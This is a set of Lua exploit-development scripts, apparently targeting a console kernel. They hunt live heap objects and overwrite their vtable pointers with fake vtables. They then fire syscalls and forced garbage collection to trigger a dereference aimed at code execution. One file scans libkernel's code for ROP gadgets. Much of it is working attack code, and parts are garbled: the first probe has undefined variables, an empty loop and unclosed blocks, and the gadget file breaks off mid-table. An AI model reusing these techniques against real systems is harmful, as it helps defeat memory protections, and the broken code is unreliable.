## probes/phase7_heap_exploitation/41o_vtable_redirect.lua

```lua
-- CRASH_CLASS: RISKY (intentional vtable corruption)
-- PROBE 41o: vtable redirect via heap write primitive
-- From 41n: live heap objects have vtable ptr 0x1_0E324EE0 at +00
-- Plan:
--   1. Allocate GPU mmap anchor, scan backward for live objects
--   2. Find one with vtable = 0x1_0E324EE0
--   3. Allocate a second mmap page as our "fake vtable" region
--   4. Fill fake vtable with recognizable marker values
--   5. Overwrite object's +00 to point to our fake vtable
--   6. Try syscall triggers to force vtable dereference
--   7. After each trigger, check if fake vtable was READ (entries changed/zeroed)
--   8. Restore original vtable before exit
-- NOTE: this WILL likely crash the loader or the process

print("=== PROBE 41o: VTABLE REDIRECT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function dump_qword(val)
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", val.h, val.l)
    end
    return string.format("%016X", to_num(val))
end
local function hex(n)
    if type(n) == "table" and n.h then
        return string.format("0x%08X%08X", n.h, n.l)
    end
    return string.format("0x%X", tonumber(n) or 0)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, lo, hi)
    local ok1 = safe_wd(addr, lo)
    local ok2 = safe_wd(addr + 4, hi)
    return ok1 and ok2
end

local sc_mmap   = make_syscall(477)
local sc_munmap = make_syscall(588)
local sc_pipe   = make_syscall(42)
local sc_close  = make_syscall(6)
local sc_socket = make_syscall(97)
local sc_evf_create = make_syscall(538)
local sc_evf_delete = make_syscall(539)
local sc_dynlib_get_list = make_syscall(592)
local sc_sigaction = make_syscall(416)
local PAGE = 0x4000

local function do_mmap(sz)
    local ok, ret = pcall(function()
        return sc_mmap(uint64(0), uint64(sz), uint64(0x33),
            uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
    end)
    if not ok then return nil end
    local addr = to_num(ret)
    if addr == 0 or addr >= 0xFFFFFFFF00000000 then return nil end
    return addr
end

--------------------------------------------------------------------
-- STEP 1: Allocate anchor + fake vtable page
--------------------------------------------------------------------
local anchor = do_mmap(PAGE)
if not anchor then print("anchor mmap FAILED"); return end
print("anchor: " .. hex(anchor))

-- Allocate a SECOND page for our fake vtable
local fake_vt_page = do_mmap(PAGE)
if not fake_vt_page then print("fake_vt mmap FAILED"); return end
print("fake_vt page: " .. hex(fake_vt_page))
print("")

--------------------------------------------------------------------
-- STEP 2: Find a live object with vtable 0x1_0E324EE0
-- The vtable value may differ per run, so match pattern:
-- +00 hi=1, lo in range 0x08000000-0x1FFFFFFF (data segment)
-- +08 is a small value (type tag)
-- At least one heap ptr in +10..+40
--------------------------------------------------------------------
print("--- STEP 2: FIND LIVE OBJECT ---")

local victim = nil
local victim_vtable_lo = nil
local victim_vtable_hi = nil

for i = 1, 384 do
    local pg = anchor - i * 0x1000
    if pg <= 0 then break end

    -- quick check: skip zero and freed pages
    local first_dw = safe_rd(pg)
    if first_dw == nil then break end
    if first_dw == 0 or first_dw == 0xAFAFAFAF then
        -- skip
    else
        -- scan at 0x40 alignment (object size from 41i)
        for off = 0, 0xF00, 0x40 do
            local a = pg + off
            local q0 = safe_rq(uint64(a))
            if q0 then
                local h0, l0 = get_hi_lo(q0)
                -- vtable pattern: hi=1, lo is a reasonable data-segment addr
                if h0 == 1 and l0 >= 0x08000000 and l0 < 0x20000000 then
                    -- verify: +08 should be a small value (tag/size)
                    local q1 = safe_rq(uint64(a + 8))
                    if q1 then
                        local h1, l1 = get_hi_lo(q1)
                        if h1 == 0 and l1 < 0x10000 then
                            -- looks like a vtable + tag structure
                            victim = a
                            victim_vtable_hi = h0
                            victim_vtable_lo = l0
                            break
                        end
                    end
                end
            end
        end
    end
    if victim then break end
end

if not victim then
    print("  no live object found with vtable pattern")
    -- try broader: any object where +00 is hi=1
    for i = 1, 256 do
        local pg = anchor - i * 0x1000
        if pg <= 0 then break end
        local first_dw = safe_rd(pg)
        if first_dw == nil then break end
        if first_dw ~= 0 and first_dw ~= 0xAFAFAFAF then
            for off = 0, 0xF00, 0x10 do
                local q0 = safe_rq(uint64(pg + off))
                if q0 then
                    local h0, l0 = get_hi_lo(q0)
                    if h0 == 1 and l0 > 0x01000000 then
                        victim = pg + off
                        victim_vtable_hi = h0
                        victim_vtable_lo = l0
                        break
                    end
                end
            end
        end
        if victim then break end
    end
end

if not victim then
    print("  STILL no victim found. Dumping sample pages...")
    for i = 1, 8 do
        local pg = anchor - i * 0x1000
        local d = safe_rd(pg)
        if d then
            local q = safe_rq(uint64(pg))
            print(string.format("  pg-%d (%s): dw=%s q=%s",
                i, hex(pg), hex(d), q and dump_qword(q) or "?"))
        end
    end
    pcall(function() sc_munmap(uint64(anchor), uint64(PAGE)) end)
    pcall(function() sc_munmap(uint64(fake_vt_page), uint64(PAGE)) end)
    print("=== PROBE 41o COMPLETE (no victim) ===")
    return
end

print(string.format("  VICTIM at %s, vtable=%08X_%08X",
    hex(victim), victim_vtable_hi, victim_vtable_lo))

-- dump victim object
print("  victim dump:")
for off = 0, 0x78, 8 do
    local q = safe_rq(uint64(victim + off))
    if q then
        local h, l = get_hi_lo(q)
        local tag = ""
        if off == 0 then tag = " <-- VTABLE" end
        if h == 3 then tag = tag .. " HEAP" end
        if h == 1 then tag = tag .. " DATA" end
        if h ~= 0 or l ~= 0 then
            print(string.format("    +%02X: %s%s", off, dump_qword(q), tag))
        end
    end
end
print("")

--------------------------------------------------------------------
-- STEP 3: Build fake vtable in our controlled page
-- Fill it with marker values we can detect if read
-- Use addresses back into our own page for "function pointers"
-- so if the kernel calls one, it hits our data (crash with known PC)
--------------------------------------------------------------------
print("--- STEP 3: BUILD FAKE VTABLE ---")

-- write 32 qword entries (256 bytes) of recognizable markers
-- each entry = fake_vt_page + 0x1000 + (slot * 8) => points into our page
-- but we'll use distinctive values: 0xDEADxxxx pattern
for slot = 0, 31 do
    local off = slot * 8
    local marker_lo = 0xDEAD0000 + slot
    local marker_hi = 0x00000000  -- keep in 32-bit range for safety
    -- actually: use the anchor address as a "function pointer"
    -- if kernel tries to call it, it'll jump to our mmap page (NX crash)
    -- which gives us a PC = anchor value in the crash log
    if slot < 16 then
        -- point to different offsets in our page
        safe_wq(fake_vt_page + off, anchor + slot * 0x100, 0)
    else
        -- distinctive markers for higher slots
        safe_wq(fake_vt_page + off, marker_lo, marker_hi)
    end
end

-- verify
print("  fake vtable at " .. hex(fake_vt_page) .. ":")
for off = 0, 0x78, 8 do
    local q = safe_rq(fake_vt_page + off)
    if q then
        print(string.format("    [+%02X] %s", off, dump_qword(q)))
    end
end
print("")

--------------------------------------------------------------------
-- STEP 4: Overwrite victim's vtable pointer
--------------------------------------------------------------------
print("--- STEP 4: REDIRECT VTABLE ---")

-- save original
local orig_lo = victim_vtable_lo
local orig_hi = victim_vtable_hi
print(string.format("  original vtable: %08X_%08X", orig_hi, orig_lo))
print(string.format("  new vtable:      %08X_%08X", 0, fake_vt_page))

-- write the new vtable pointer (our fake_vt_page address)
-- fake_vt_page is in 0x3_1xxxxxxx range (heap), so hi=3-ish
-- Actually fake_vt_page is from mmap, could be different range
local fvt_hi = 0
local fvt_lo = fake_vt_page
-- handle >32-bit addresses
if fake_vt_page > 0xFFFFFFFF then
    -- need to split
    fvt_hi = math.floor(fake_vt_page / 0x100000000)
    fvt_lo = fake_vt_page % 0x100000000
end

local w_ok = safe_wq(victim, fvt_lo, fvt_hi)
print("  write ok: " .. tostring(w_ok))

-- verify the overwrite
local check = safe_rq(uint64(victim))
if check then
    print("  victim +00 now: " .. dump_qword(check))
else
    print("  victim +00: FAULT (page gone!)")
    print("=== PROBE 41o COMPLETE (victim lost) ===")
    return
end
print("")

--------------------------------------------------------------------
-- STEP 5: Trigger syscalls that might dereference the object
-- After each, check if our fake vtable entries were read/modified
--------------------------------------------------------------------
print("--- STEP 5: TRIGGER ATTEMPTS ---")

local function check_vt_intact()
    -- read first 4 entries of fake vtable, see if they changed
    local changed = 0
    for slot = 0, 3 do
        local q = safe_rq(fake_vt_page + slot * 8)
        if q then
            local h, l = get_hi_lo(q)
            local expected = anchor + slot * 0x100
            if l ~= expected or h ~= 0 then
                changed = changed + 1
            end
        else
            changed = changed + 1  -- page gone = definitely touched
        end
    end
    return changed == 0
end

print("  baseline vt intact: " .. tostring(check_vt_intact()))

-- 5a: mmap/munmap churn
for i = 1, 8 do
    local a = do_mmap(PAGE)
    if a then pcall(function() sc_munmap(uint64(a), uint64(PAGE)) end) end
end
print("  after mmap churn: vt_intact=" .. tostring(check_vt_intact()))

-- 5b: pipe
local pb = memory.alloc(16)
for i = 1, 4 do
    pcall(function() sc_pipe(pb) end)
    local f0 = safe_rd(pb)
    local f1 = safe_rd(pb + 4)
    if f0 and f0 > 0 then pcall(function() sc_close(f0) end) end
    if f1 and f1 > 0 then pcall(function() sc_close(f1) end) end
end
print("  after pipe churn: vt_intact=" .. tostring(check_vt_intact()))

-- 5c: socket
for i = 1, 4 do
    local ok_s, fd = pcall(function() return sc_socket(2, 1, 0) end)
    if ok_s then
        local fdn = to_num(fd)
        if fdn > 0 then pcall(function() sc_close(fdn) end) end
    end
end

memory.write_byte(nb + 1, 0x74) -- t

    local ok_e, re = pcall(function() return sc_evf_create(nb, 0x11, memory.alloc(8)) end)
    if ok_e then
        local eid = to_num(re)
        if eid > 0 and eid < 100000 then
            pcall(function() sc_evf_delete(eid) end)
        end
    end

print("  after EVF churn: vt_intact=" .. tostring(check_vt_intact()))

local nb2 = memory.alloc(8)
pcall(function() sc_dynlib_get_list(hb, 128, nb2) end)
print("  after dynlib walk: vt_intact=" .. tostring(check_vt_intact()))

for sig = 1, 8 do

print("  after sigaction: vt_intact=" .. tostring(check_vt_intact()))

pcall(function()
    sc_mmap(uint64(0), uint64(PAGE), uint64(0x03),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("  after extra mmap: vt_intact=" .. tostring(check_vt_intact()))

pcall(function() sc_munmap(uint64(anchor), uint64(PAGE)) end)
local anchor2 = do_mmap(PAGE)

--------------------------------------------------------------------
print("--- STEP 6: FINAL STATE ---")
local final_q0 = safe_rq(uint64(victim))
if final_q0 then
    print("  victim +00: " .. dump_qword(final_q0))
    local fh, fl = get_hi_lo(final_q0)
    if fl == fvt_lo and fh == fvt_hi then

    print("  restored: " .. (restored and dump_qword(restored) or "FAULT"))
else
    print("  victim FAULT — object was freed/moved")
end

print("  fake vtable final state:")
for off = 0, 0x38, 8 do
    local q = safe_rq(fake_vt_page + off)
    if q then
        print(string.format("    [+%02X] %s", off, dump_qword(q)))
    else
        print(string.format("    [+%02X] FAULT", off))
    end

pcall(function() sc_munmap(uint64(fake_vt_page), uint64(PAGE)) end)
```

## probes/phase7_heap_exploitation/41p_downward_scan.lua

```lua
-- 14.10 Probe 41p: downward heap scan (guard-page aware)
-- Map so far (this boot family):
--   * mapped main heap ends at 0x310DC0000 (41o fault), guard page there
--   * fresh allocs live ABOVE the guard (anchor was 0x310E05520)
--   * 41o scanned 0x310A05520..0x310D85520: mapped, ZERO hits
--   * 41k found TARGET_LO objects at ~0x310856000 -> below scanned zone
-- Plan: targeted check of 41k's spot, then scan DOWNWARD from the known-
-- mapped 0x310A05520 toward the arena base. Downward = hits print before
-- any bottom-boundary crash. Keepalives keep the socket alive.

print("=== 41p: DOWNWARD SCAN ===")
print("fw: " .. tostring(FW_VERSION))
print("pid: " .. syscall.getpid():tonumber())

local TARGET_LO = 0x1A3A4EE0

local function to_num(v)
    local ok, n = pcall(function() return v:tonumber() end)
    if ok then return n end
    return tonumber(v) or 0
end

local anchor_buf = memory.alloc(16)
local anchor = to_num(anchor_buf)
local heap_hi = math.floor(anchor / 0x100000000)
print(string.format("alloc anchor: 0x%x (hi=0x%x)", anchor, heap_hi))

-- ---------------------------------------------------------------
-- PART 1: 41k's historic object location (crash here = layout moved)
-- ---------------------------------------------------------------
print("")
print("--- 41k spot check @ 0x310856000 (tag before read) ---")
local sp = 0x310856000
local l1 = memory.read_dword(sp):tonumber()
local h1 = memory.read_dword(sp + 4):tonumber()
local l2 = memory.read_dword(sp + 8):tonumber()
local h2 = memory.read_dword(sp + 12):tonumber()
print(string.format("0x310856000: %08x_%08x  %08x_%08x", h1, l1, h2, l2))

-- ---------------------------------------------------------------
-- PART 2: downward scan from known-mapped boundary
-- ---------------------------------------------------------------
print("")
local TOP = 0x310A05520
local BOT = 0x310000000
print(string.format("scanning DOWN 0x%x -> 0x%x", TOP, BOT))

local hits = {}
local a = TOP
local iter = 0
while a >= BOT do
    if memory.read_dword(a):tonumber() == TARGET_LO then
        table.insert(hits, a)
        print(string.format("HIT @ 0x%x", a))
        if #hits >= 24 then break end
    end
    a = a - 8
    iter = iter + 1
    if iter % 0x8000 == 0 then
        print(string.format("  ... 0x%x (%d hits)", a, #hits))
    end
end
print("scan done: " .. #hits .. " hits")

if #hits == 0 then
    print("no hits in lower heap either")
    print("=== 41p DONE (no hits) ===")
    return
end

-- ---------------------------------------------------------------
-- PART 3: full header qwords
-- ---------------------------------------------------------------
print("")
print("--- full header qwords ---")
local real_P = 0
for i = 1, math.min(#hits, 8) do
    local base = hits[i]
    local qw_lo = memory.read_dword(base):tonumber()
    local qw_hi = memory.read_dword(base + 4):tonumber()
    print(string.format("obj @ 0x%x: +0 = %08x_%08x", base, qw_hi, qw_lo))
    if real_P == 0 and qw_hi ~= 0 then
        real_P = qw_hi * 0x100000000 + qw_lo
    end
end

if real_P == 0 then
    print("all high dwords 0 — TARGET is a 32-bit value, not a pointer half")
    print("=== 41p DONE (no pointer) ===")
    return
end
print(string.format("real header pointer P = 0x%x", real_P))

-- ---------------------------------------------------------------
-- PART 4: dump at P (tag before each read; P may be unmapped — the
-- tag tells us exactly which read kills the loader)
-- ---------------------------------------------------------------
print("")
print("--- dump at P ---")
local entries = {}
for off = 0, 0x78, 8 do
    print(string.format("read P+0x%02x", off))
    local p = real_P + off
    local ql = memory.read_dword(p):tonumber()
    local qh = memory.read_dword(p + 4):tonumber()
    local v = qh * 0x100000000 + ql
    local cls = "other"
    if v == 0 then cls = "null"
    elseif v < 0x10000 then cls = "small-int"
    elseif qh == heap_hi then cls = "HEAP"
    elseif v >= 0x20000000 and v < 0x60000000 then cls = "CODE??"
    end
    print(string.format("  P+0x%02x: %08x_%08x  %s", off, qh, ql, cls))
    if v ~= 0 then table.insert(entries, { off = off, val = v, cls = cls }) end
end

-- ---------------------------------------------------------------
-- PART 5: one-level deref of heap entries
-- ---------------------------------------------------------------
print("")
print("--- deref heap entries ---")
for _, e in ipairs(entries) do
    if e.cls == "HEAP" then
        print(string.format("deref P+0x%02x -> 0x%x", e.off, e.val))
        for i = 0, 3 do
            local p = e.val + i * 8
            local ql = memory.read_dword(p):tonumber()
            local qh = memory.read_dword(p + 4):tonumber()
            print(string.format("    +%d: %08x_%08x", i * 8, qh, ql))
        end
    end
end

print("=== 41p DONE ===")
```

## probes/phase7_heap_exploitation/41p_gc_vtable.lua

```lua
-- CRASH_CLASS: RISKY (vtable redirect + GC trigger)
-- PROBE 41p: redirect vtable then force Lua GC to dereference it
-- From 41o: vtable overwrite works, but syscalls don't trigger deref
-- Hypothesis: objects are Lua-managed, GC sweep reads the vtable
-- Plan:
--   1. Find live object with hi=1 vtable pattern
--   2. Build fake vtable in our mmap page
--   3. Overwrite vtable pointer
--   4. Force GC via collectgarbage() and massive allocation pressure
--   5. Check if fake vtable was read or if we crash (= code exec)
-- OUTPUT STRATEGY: flush every line immediately so we capture
-- as much as possible before a crash

print("=== PROBE 41p: GC VTABLE TRIGGER ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function dump_qword(val)
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", val.h, val.l)
    end
    return string.format("%016X", to_num(val))
end
local function hex(n)
    if type(n) == "table" and n.h then
        return string.format("0x%08X%08X", n.h, n.l)
    end
    return string.format("0x%X", tonumber(n) or 0)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, lo, hi)
    safe_wd(addr, lo)
    safe_wd(addr + 4, hi)
end

local sc_mmap   = make_syscall(477)
local sc_munmap = make_syscall(588)
local PAGE = 0x4000

local function do_mmap(sz)
    local ok, ret = pcall(function()
        return sc_mmap(uint64(0), uint64(sz), uint64(0x33),
            uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
    end)
    if not ok then return nil end
    local addr = to_num(ret)
    if addr == 0 or addr >= 0xFFFFFFFF00000000 then return nil end
    return addr
end

--------------------------------------------------------------------
-- STEP 1: Setup
--------------------------------------------------------------------
local anchor = do_mmap(PAGE)
if not anchor then print("anchor FAILED"); return end
local fake_vt = do_mmap(PAGE)
if not fake_vt then print("fake_vt FAILED"); return end
print("anchor=" .. hex(anchor) .. " fake_vt=" .. hex(fake_vt))

--------------------------------------------------------------------
-- STEP 2: Find victim with hi=1 vtable
--------------------------------------------------------------------
print("--- FIND VICTIM ---")
local victim = nil
local orig_hi, orig_lo = 0, 0

for i = 1, 384 do
    local pg = anchor - i * 0x1000
    if pg <= 0 then break end
    local d = safe_rd(pg)
    if d == nil then break end
    if d ~= 0 and d ~= 0xAFAFAFAF then
        for off = 0, 0xF00, 0x10 do
            local q = safe_rq(uint64(pg + off))
            if q then
                local h, l = get_hi_lo(q)
                if h == 1 and l > 0x01000000 then
                    victim = pg + off
                    orig_hi = h
                    orig_lo = l
                    break
                end
            end
        end
    end
    if victim then break end
end

if not victim then
    print("NO VICTIM")
    pcall(function() sc_munmap(uint64(anchor), uint64(PAGE)) end)
    pcall(function() sc_munmap(uint64(fake_vt), uint64(PAGE)) end)
    return
end
print("victim=" .. hex(victim) .. " vtable=" .. string.format("%08X_%08X", orig_hi, orig_lo))

-- snapshot victim
print("victim dump:")
for off = 0, 0x78, 8 do
    local q = safe_rq(uint64(victim + off))
    if q then
        local h, l = get_hi_lo(q)
        if h ~= 0 or l ~= 0 then
            print(string.format("  +%02X: %s", off, dump_qword(q)))
        end
    end
end
print("")

--------------------------------------------------------------------
-- STEP 3: Build fake vtable with sentinel markers
-- Use unique dwords per slot so crash PC tells us which slot
--------------------------------------------------------------------
print("--- BUILD FAKE VTABLE ---")
for slot = 0, 31 do
    local off = slot * 8
    -- each entry: 0x41410000 + slot as a 32-bit "function pointer"
    -- if called, crash PC = 0x4141xxxx (recognizable, in low unmapped range)
    local fptr = 0x41410000 + slot * 0x10
    safe_wq(fake_vt + off, fptr, 0)
end
-- verify first entries
for off = 0, 0x38, 8 do
    local q = safe_rq(fake_vt + off)
    print(string.format("  [+%02X] %s", off, q and dump_qword(q) or "?"))
end
print("")

--------------------------------------------------------------------
-- STEP 4: Overwrite vtable
--------------------------------------------------------------------
print("--- REDIRECT ---")
-- fake_vt address: need to split into hi/lo 32-bit parts
local fvt_lo = fake_vt % 0x100000000
local fvt_hi = math.floor(fake_vt / 0x100000000)
safe_wq(victim, fvt_lo, fvt_hi)
local check = safe_rq(uint64(victim))
print("victim+00=" .. (check and dump_qword(check) or "FAULT"))
print("")

--------------------------------------------------------------------
-- STEP 5: Trigger GC
-- Lua 5.1 collectgarbage modes: "collect", "stop", "restart",
-- "count", "step", "setpause", "setstepmul"
--------------------------------------------------------------------
print("--- GC TRIGGERS ---")

-- 5a: direct full GC cycle
print("5a: collectgarbage('collect')")
local ok_gc, err_gc = pcall(collectgarbage, "collect")
print("  result: ok=" .. tostring(ok_gc) .. " err=" .. tostring(err_gc))

-- check fake vtable
local vt_after_gc = safe_rq(fake_vt)
print("  vt[0]=" .. (vt_after_gc and dump_qword(vt_after_gc) or "FAULT"))

-- 5b: aggressive step GC
print("5b: step GC x10")
for i = 1, 10 do
    pcall(collectgarbage, "step", 1000)
end
vt_after_gc = safe_rq(fake_vt)
print("  vt[0]=" .. (vt_after_gc and dump_qword(vt_after_gc) or "FAULT"))

-- 5c: allocation pressure — create lots of tables to force GC
print("5c: allocation pressure (1000 tables)")
local pressure = {}
for i = 1, 1000 do
    pressure[i] = {a = i, b = tostring(i), c = {i, i+1, i+2}}
end
pcall(collectgarbage, "collect")
vt_after_gc = safe_rq(fake_vt)
print("  vt[0]=" .. (vt_after_gc and dump_qword(vt_after_gc) or "FAULT"))

-- 5d: free them all and GC
print("5d: free + GC")
pressure = nil
pcall(collectgarbage, "collect")
pcall(collectgarbage, "collect")
vt_after_gc = safe_rq(fake_vt)
print("  vt[0]=" .. (vt_after_gc and dump_qword(vt_after_gc) or "FAULT"))

-- 5e: string pressure (strings are interned, GC sweeps them)
print("5e: string pressure")
local strings = {}
for i = 1, 500 do
    strings[i] = string.rep(tostring(i), 100)
end
strings = nil
pcall(collectgarbage, "collect")
vt_after_gc = safe_rq(fake_vt)
print("  vt[0]=" .. (vt_after_gc and dump_qword(vt_after_gc) or "FAULT"))

-- 5f: userdata pressure (might use the vtable for __gc)
print("5f: userdata via memory.alloc")
local uds = {}
for i = 1, 100 do
    uds[i] = memory.alloc(256)
end
uds = nil
pcall(collectgarbage, "collect")
vt_after_gc = safe_rq(fake_vt)
print("  vt[0]=" .. (vt_after_gc and dump_qword(vt_after_gc) or "FAULT"))

-- 5g: coroutine creation + death (complex GC objects)
print("5g: coroutine pressure")
for i = 1, 50 do
    local co = coroutine.create(function()
        local t = {}
        for j = 1, 100 do t[j] = j end
        coroutine.yield(t)
    end)
    coroutine.resume(co)
    -- don't finish it, let it die
end
pcall(collectgarbage, "collect")
vt_after_gc = safe_rq(fake_vt)
print("  vt[0]=" .. (vt_after_gc and dump_qword(vt_after_gc) or "FAULT"))

-- 5h: setpause(0) + setstepmul(10000) for super aggressive GC
print("5h: aggressive GC config")
pcall(collectgarbage, "setpause", 0)
pcall(collectgarbage, "setstepmul", 10000)
-- now any alloc should trigger GC
for i = 1, 200 do
    local t = {a=1, b=2, c=3}
end
pcall(collectgarbage, "collect")
vt_after_gc = safe_rq(fake_vt)
print("  vt[0]=" .. (vt_after_gc and dump_qword(vt_after_gc) or "FAULT"))
-- restore normal GC
pcall(collectgarbage, "setpause", 200)
pcall(collectgarbage, "setstepmul", 200)

print("")

--------------------------------------------------------------------
-- STEP 6: Check if victim object was touched during GC
--------------------------------------------------------------------
print("--- VICTIM STATE ---")
local final = safe_rq(uint64(victim))
if final then
    local fh, fl = get_hi_lo(final)
    print("victim+00: " .. dump_qword(final))
    if fl == fvt_lo and fh == fvt_hi then
        print("still points to fake vtable (GC did not deref via +00)")
    else
        print("*** CHANGED! something accessed it ***")
    end
else
    print("victim FAULT — freed by GC!")
end

-- check all fake vtable slots for changes
print("fake vtable check:")
local any_changed = false
for slot = 0, 15 do
    local q = safe_rq(fake_vt + slot * 8)
    if q then
        local h, l = get_hi_lo(q)
        local expected = 0x41410000 + slot * 0x10
        if l ~= expected or h ~= 0 then
            print(string.format("  [+%02X] %s CHANGED (was %08X)", slot*8, dump_qword(q), expected))
            any_changed = true
        end
    else
        print(string.format("  [+%02X] FAULT", slot*8))
        any_changed = true
    end
end
if not any_changed then
    print("  all slots intact — vtable was NOT dereferenced by GC")
end
print("")

--------------------------------------------------------------------
-- STEP 7: Restore + cleanup
--------------------------------------------------------------------
print("--- RESTORE ---")
if safe_rq(uint64(victim)) then
    safe_wq(victim, orig_lo, orig_hi)
    local r = safe_rq(uint64(victim))
    print("restored: " .. (r and dump_qword(r) or "FAULT"))
else
    print("victim gone, nothing to restore")
end

pcall(function() sc_munmap(uint64(anchor), uint64(PAGE)) end)
pcall(function() sc_munmap(uint64(fake_vt), uint64(PAGE)) end)
print("=== PROBE 41p COMPLETE ===")
```

## probes/phase7_heap_exploitation/41p_libkernel_gadgets.lua

```lua
-- CRASH_CLASS: SAFE (read-only)
-- PROBE 41p: dump libkernel text segment and find ROP gadgets
-- From 41o: dynlib_get_info(0x2001) = libkernel.sprx
--   text base = 0x8_112BC000, text size = 0x48000
--   data base = 0x8_11304000, data size = 0x20000
-- We search for: syscall; ret (0F 05 C3), pop rdi; ret (5F C3),
-- pop rsi; ret (5E C3), pop rdx; ret (5A C3), pop rcx; ret (59 C3),
-- pop rax; ret (58 C3), pop r8; ret (41 58 C3), ret (C3),
-- stack pivot (xchg rsp,X / mov rsp,X), jmp rax (FF E0)

print("=== PROBE 41p: LIBKERNEL GADGET SCAN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function hex(n)
    if type(n) == "table" and n.h then
        return string.format("0x%08X%08X", n.h, n.l)
    end
    return string.format("0x%X", tonumber(n) or 0)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end

--------------------------------------------------------------------
-- STEP 1: Re-derive libkernel base (ASLR changes per run)
--------------------------------------------------------------------
print("--- STEP 1: LOCATE LIBKERNEL ---")

local sc_dynlib_get_list = make_syscall(592)
local sc_dynlib_get_info = make_syscall(593)

local handle_buf = memory.alloc(512)
local num_buf = memory.alloc(8)
pcall(function() sc_dynlib_get_list(handle_buf, uint64(128), num_buf) end)

local num_h = safe_rd(num_buf)
print("loaded modules: " .. (num_h or "?"))

-- find libkernel handle (was 0x2001 last run, but check all)
local libk_handle = nil
local libk_text_base = nil
local libk_text_size = nil
local libk_data_base = nil

local info_buf = memory.alloc(0x200)

for i = 0, math.min((num_h or 0) - 1, 63) do
    local h = safe_rd(handle_buf + i * 4)
    if h then
        for off = 0, 0x1F8, 4 do safe_wd(info_buf + off, 0) end
        safe_wd(info_buf, 0x160)

        local ok_gi = pcall(function()
            sc_dynlib_get_info(uint64(h), info_buf)
        end)
        if ok_gi then
            -- check name at +08 for "libkernel" (6C69626B 65726E65 6C)
            local n1 = safe_rd(info_buf + 0x08)
            local n2 = safe_rd(info_buf + 0x0C)
            -- "libk" = 0x6B62696C, "erne" = 0x656E7265
            if n1 == 0x6B62696C and n2 == 0x656E7265 then
                libk_handle = h

                -- text segment: +108=base(lo), +10C=base(hi), +110=size(lo)
                local tbl = safe_rd(info_buf + 0x108)
                local tbh = safe_rd(info_buf + 0x10C)
                local tsl = safe_rd(info_buf + 0x110)
                local tsh = safe_rd(info_buf + 0x114)

                if tbl and tbh then
                    local base_hex = string.format("0x%X%08X", tbh, tbl)
                    libk_text_base = uint64(base_hex)
                    libk_text_size = tsl or 0
                    print(string.format("libkernel handle: 0x%X", h))
                    print(string.format("text base: %s", base_hex))
                    print(string.format("text size: 0x%X", libk_text_size))
                end

                -- data segment: +118=base, +120=size
                local dbl = safe_rd(info_buf + 0x118)
                local dbh = safe_rd(info_buf + 0x11C)
                if dbl and dbh then
                    local dbase_hex = string.format("0x%X%08X", dbh, dbl)
                    libk_data_base = uint64(dbase_hex)
                    print(string.format("data base: %s", dbase_hex))
                end
                break
            end
        end
    end
end

if not libk_text_base then
    print("FAILED to find libkernel")
    print("=== PROBE 41p FAILED ===")
    return
end
print("")

-- verify we can read the text segment
-- safe_rd takes a number or uint64; libk_text_base is uint64
local test_dw = safe_rd(libk_text_base)
if test_dw then
    print("text segment readable, first dword: " .. string.format("0x%08X", test_dw))
else
    print("text NOT readable via dword, trying qword...")
    local tq = safe_rq(libk_text_base)
    if tq then
        print("readable via qword: " .. dump_qword(tq))
    else
        print("FAULT — cannot read libkernel text")
        -- try reading the first byte
        local tb = safe_rb(libk_text_base)
        if tb then
            print("but readable via byte: " .. string.format("0x%02X", tb))
        else
            print("=== PROBE 41p FAILED ===")
            return
        end
    end
end
print("")

--------------------------------------------------------------------
-- STEP 2: Scan for gadgets
-- Read 4 bytes at a time (dword), check byte patterns
-- Limit: scan first 0x20000 bytes to stay within loader budget
--------------------------------------------------------------------
print("--- STEP 2: GADGET SCAN ---")

local gadgets = {
    syscall_ret = {},    -- 0F 05 C3
    pop_rdi_ret = {},    -- 5F C3
    pop_rsi_ret = {},    -- 5E C3
    pop_rdx_ret = {},    -- 5A C3
    pop_rcx_ret = {},    -- 59 C3
    pop_rax_ret = {},    -- 58 C3
